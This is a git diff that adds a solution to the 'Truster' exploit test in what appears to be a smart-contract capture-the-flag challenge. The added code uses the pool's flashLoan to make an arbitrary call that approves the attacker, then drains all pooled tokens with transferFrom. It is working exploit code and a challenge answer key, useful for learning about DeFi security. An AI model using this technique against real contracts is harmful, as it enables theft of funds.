@@ -29,6 +29,13 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const ABI = [
+            "function approve(address spender, uint256 amount)"
+        ];
+        const interface = new ethers.utils.Interface(ABI);
+        const data = interface.encodeFunctionData('approve', [attacker.address, TOKENS_IN_POOL.toString()]);
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
